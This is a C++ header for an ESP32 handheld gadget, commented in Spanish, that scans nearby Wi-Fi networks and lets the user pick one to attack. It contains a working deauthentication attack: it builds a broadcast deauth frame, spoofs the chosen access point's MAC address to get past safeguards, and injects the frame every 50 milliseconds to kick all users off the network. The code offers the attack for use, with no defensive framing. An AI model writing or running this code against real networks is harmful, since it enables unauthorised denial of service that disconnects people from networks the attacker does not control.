#ifndef APPWIFI_H
#define APPWIFI_H
#include "App.h"
#include "Emojis.h"
#include "ui/Launcher.h"
#include "config.h" 
#include <WiFi.h>
#include "esp_wifi.h"

#define LED_PIN 48

enum EstadoWiFi { SCAN_WIFI, LISTA_WIFI, ATACANDO_WIFI };

class AppWiFi : public App {
private:
    EstadoWiFi estado = SCAN_WIFI;
    int n_redes = 0;
    int indiceSeleccionado = 0;

    unsigned long ultimoParpadeo = 0;
    unsigned long ultimoMovimiento = 0;
    unsigned long ultimoAtaque = 0;
    
    // Variables para la animación Neón y Temporizador visual
    int anguloNeon = 0;
    unsigned long ultimoFrameNeon = 0;
    unsigned long inicioEscaneo = 0;
    int segundosRestantes = 4;
    
    bool estadoLed = false;
    bool pantallaActualizada = false;
    bool btnAnterior = false;

    // Datos del objetivo
    uint8_t macObjetivo[6];
    int canalObjetivo = 1;
    String nombreObjetivo = "";

    // Plantilla de Paquete Deauth (Desautenticación Broadcast = 0xC0)
    uint8_t deauth_packet[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destino (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Origen MAC (Se llena dinámicamente)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID MAC (Se llena dinámicamente)
        0x00, 0x00,                         // Secuencia
        0x07, 0x00                          // Reason Code 7
    };

public:
    const char* obtenerNombre() override { return "WIFI DEAUTH"; }
    const uint8_t* obtenerEmoji() override { return emoji_wifi; }
    
    void setup() override {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
    }

    void alEntrar() override {
        estado = SCAN_WIFI;
        n_redes = 0;
        indiceSeleccionado = 0;
        pantallaActualizada = false;
        ultimoMovimiento = millis();
        btnAnterior = (digitalRead(JOY_SW) == LOW);
        
        // Reiniciar animaciones y tiempos
        ultimoFrameNeon = millis();
        anguloNeon = 0;
        inicioEscaneo = millis();
        segundosRestantes = 4;
        
        // Escaneo asíncrono en segundo plano
        WiFi.scanNetworks(true);
    }
    
    void alSalir() override {
        WiFi.scanDelete(); 
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_STA); // Restaurar estado seguro al salir
        neopixelWrite(LED_PIN, 0, 0, 0); 
    }

    void loop(Arduino_Canvas* canvas) override {
        
        // --- MOTOR UNIFICADO DE LECTURA ---
        int valVert = joyEjeY_esVertical ? analogRead(JOY_Y) : analogRead(JOY_X);
        int valHoriz = joyEjeY_esVertical ? analogRead(JOY_X) : analogRead(JOY_Y);

        bool arriba = joyInvVertical ? (valVert > 3200) : (valVert < 800);
        bool abajo = joyInvVertical ? (valVert < 800) : (valVert > 3200);
        bool izq = joyInvHorizontal ? (valHoriz > 3200) : (valHoriz < 800);
        bool der = joyInvHorizontal ? (valHoriz < 800) : (valHoriz > 3200);

        bool botonAhora = (digitalRead(JOY_SW) == LOW);
        bool clicSimple = (botonAhora && !btnAnterior);

        // --- ANIMACIÓN NEÓN GLOBAL ---
        if (millis() - ultimoFrameNeon > 30) {
            anguloNeon = (anguloNeon + 8) % 360; 
            ultimoFrameNeon = millis();
            pantallaActualizada = false; // Fuerza redibujo continuo en cualquier menú
        }

        // ==========================================
        // ESTADO 1: ESCANEANDO EL AIRE
        // ==========================================
        if (estado == SCAN_WIFI) {
            
            if (millis() - ultimoParpadeo > 200) {
                ultimoParpadeo = millis();
                estadoLed = !estadoLed;
                if (estadoLed) neopixelWrite(LED_PIN, 255, 0, 0); // Led Rojo buscando
                else neopixelWrite(LED_PIN, 0, 0, 0);
            }

            // Cálculo del tiempo visual
            int transcurrido = (millis() - inicioEscaneo) / 1000;
            int nuevoRestante = 4 - transcurrido;
            if (nuevoRestante < 0) nuevoRestante = 0;
            
            if (nuevoRestante != segundosRestantes) {
                segundosRestantes = nuevoRestante;
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                
                // Efecto Neón Rojo
                canvas->drawCircle(120, 120, 118, IRON_RED);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_DARK); 
                canvas->drawArc(120, 120, 117, 113, (anguloNeon + 20) % 360, (anguloNeon + 50) % 360, IRON_RED); 
                canvas->drawArc(120, 120, 116, 114, (anguloNeon + 40) % 360, (anguloNeon + 45) % 360, WHITE);

                // --- TEXTO GRANDE Y LIMPIO COMO EN BLE ---
                Launcher::dibujarTextoCentrado(canvas, "WIFI SCAN", 100, 2, IRON_RED);
                
                char tiempoStr[32];
                sprintf(tiempoStr, "Termina en: %d s", segundosRestantes);
                Launcher::dibujarTextoCentrado(canvas, tiempoStr, 130, 1, WHITE);
                
                canvas->flush();
                pantallaActualizada = true;
            }

            // Revisar si ya pasaron los 4 segundos visuales
            if (segundosRestantes == 0) {
                int16_t scanRes = WiFi.scanComplete();
                if (scanRes >= 0) {
                    n_redes = scanRes;
                    estado = LISTA_WIFI;
                    neopixelWrite(LED_PIN, 0, 0, 0); 
                    pantallaActualizada = false;
                } else if (scanRes == WIFI_SCAN_FAILED) {
                    WiFi.scanNetworks(true); // Reintentar si hubo fallo de lectura
                    inicioEscaneo = millis(); // Reiniciar reloj
                }
            }
        }
        
        // ==========================================
        // ESTADO 2: LISTA DE OBJETIVOS
        // ==========================================
        else if (estado == LISTA_WIFI) {
            
            if (millis() - ultimoMovimiento > 250) {
                if (arriba) { indiceSeleccionado--; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (abajo) { indiceSeleccionado++; pantallaActualizada = false; ultimoMovimiento = millis(); }

                if (indiceSeleccionado < 0) indiceSeleccionado = (n_redes > 0) ? n_redes - 1 : 0;
                if (indiceSeleccionado >= n_redes) indiceSeleccionado = 0;

                // --- INICIA ATAQUE CON CLIC O DERECHA ---
                if ((clicSimple || der) && n_redes > 0) {
                    
                    nombreObjetivo = WiFi.SSID(indiceSeleccionado);
                    canalObjetivo = WiFi.channel(indiceSeleccionado);
                    uint8_t* bssid = WiFi.BSSID(indiceSeleccionado);
                    
                    // Preparar paquete de ataque
                    for(int i = 0; i < 6; i++) {
                        macObjetivo[i] = bssid[i];
                        deauth_packet[10 + i] = macObjetivo[i]; 
                        deauth_packet[16 + i] = macObjetivo[i]; 
                    }
                    
                    // --- BYPASS DE SEGURIDAD (MAC SPOOFING) ---
                    WiFi.mode(WIFI_AP);
                    esp_wifi_set_mac(WIFI_IF_AP, macObjetivo);
                    WiFi.softAP("IronOS_Phantom", NULL, canalObjetivo, 1, 1); 

                    estado = ATACANDO_WIFI;
                    pantallaActualizada = false;
                    ultimoMovimiento = millis();
                    ultimoAtaque = millis();
                }
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                
                // Efecto Neón Cyan de navegación segura
                canvas->drawCircle(120, 120, 118, IRON_CYAN);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_BLUE); 
                canvas->drawArc(120, 120, 117, 113, (anguloNeon + 20) % 360, (anguloNeon + 50) % 360, IRON_CYAN); 
                canvas->drawArc(120, 120, 116, 114, (anguloNeon + 40) % 360, (anguloNeon + 45) % 360, WHITE); 

                char titulo[32];
                sprintf(titulo, "REDES WIFI (%d)", n_redes);
                Launcher::dibujarTextoCentrado(canvas, titulo, 30, 1, IRON_CYAN);
                canvas->drawLine(20, 40, 220, 40, IRON_DARK);

                if (n_redes == 0) {
                    Launcher::dibujarTextoCentrado(canvas, "NO HAY REDES", 110, 2, IRON_BLUE);
                } else {
                    int inicio = indiceSeleccionado - 1;
                    if (inicio < 0) inicio = 0;
                    if (n_redes > 3 && inicio > n_redes - 3) inicio = n_redes - 3;

                    for (int i = 0; i < 3 && (inicio + i) < n_redes; i++) {
                        int idx = inicio + i;
                        int yPos = 65 + (i * 35);

                        if (idx == indiceSeleccionado) {
                            canvas->fillRoundRect(10, yPos - 10, 220, 25, 3, IRON_DARK);
                            canvas->fillTriangle(15, yPos-2, 15, yPos+6, 20, yPos+2, IRON_CYAN);
                            canvas->setTextColor(WHITE);
                        } else {
                            canvas->setTextColor(IRON_BLUE);
                        }

                        canvas->setTextSize(1);
                        canvas->setCursor(25, yPos);
                        
                        String ssidStr = WiFi.SSID(idx);
                        if(ssidStr.length() > 11) ssidStr = ssidStr.substring(0, 11);
                        
                        String textoItem = String(idx + 1) + ". " + ssidStr + " [" + String(WiFi.RSSI(idx)) + "]";
                        canvas->print(textoItem);
                    }
                    Launcher::dibujarTextoCentrado(canvas, "Clic/Der = ATACAR", 175, 1, IRON_RED);
                }

                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setCursor(120 - 25, 200);
                canvas->setTextColor(IRON_RED);
                canvas->print("DOBLE CLICK");

                canvas->flush();
                pantallaActualizada = true;
            }
        }
        
        // ==========================================
        // ESTADO 3: ATACANDO (DEAUTH INJECTION)
        // ==========================================
        else if (estado == ATACANDO_WIFI) {
            
            // LED ROJO Parpadeando Rápido
            if (millis() - ultimoParpadeo > 80) {
                ultimoParpadeo = millis();
                estadoLed = !estadoLed;
                if (estadoLed) neopixelWrite(LED_PIN, 255, 0, 0);
                else neopixelWrite(LED_PIN, 0, 0, 0);
            }

            if (millis() - ultimoAtaque > 50) {
                ultimoAtaque = millis();
                esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
            }

            if (millis() - ultimoMovimiento > 250) {
                if (izq || clicSimple) {
                    WiFi.softAPdisconnect(true);
                    WiFi.mode(WIFI_STA); 

                    estado = LISTA_WIFI;
                    neopixelWrite(LED_PIN, 0, 0, 0); 
                    pantallaActualizada = false;
                    ultimoMovimiento = millis();
                }
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                
                // Efecto Neón Rojo de Alerta/Ataque
                canvas->drawCircle(120, 120, 118, IRON_RED);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_DARK); 
                canvas->drawArc(120, 120, 117, 113, (anguloNeon + 20) % 360, (anguloNeon + 50) % 360, IRON_RED); 
                canvas->drawArc(120, 120, 116, 114, (anguloNeon + 40) % 360, (anguloNeon + 45) % 360, WHITE); 

                Launcher::dibujarTextoCentrado(canvas, "DEAUTH ATTACK", 35, 1, IRON_RED);
                canvas->drawLine(30, 45, 210, 45, IRON_DARK);

                Launcher::dibujarTextoCentrado(canvas, nombreObjetivo.substring(0, 18).c_str(), 75, 2, WHITE);
                
                char macStr[32];
                sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
                        macObjetivo[0], macObjetivo[1], macObjetivo[2], 
                        macObjetivo[3], macObjetivo[4], macObjetivo[5]);
                Launcher::dibujarTextoCentrado(canvas, macStr, 105, 1, IRON_BLUE);

                char chStr[32];
                sprintf(chStr, "Canal: %d", canalObjetivo);
                Launcher::dibujarTextoCentrado(canvas, chStr, 125, 1, IRON_CYAN);

                Launcher::dibujarTextoCentrado(canvas, "EXPULSANDO USUARIOS...", 150, 1, IRON_RED);

                Launcher::dibujarTextoCentrado(canvas, "< Volver = Clic/Izq", 175, 1, IRON_DARK);

                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setCursor(120 - 25, 200);
                canvas->setTextColor(IRON_RED);
                canvas->print("DOBLE CLICK");

                canvas->flush();
                pantallaActualizada = true;
            }
        }

        btnAnterior = botonAhora;
        delay(10);
    }
};
#endif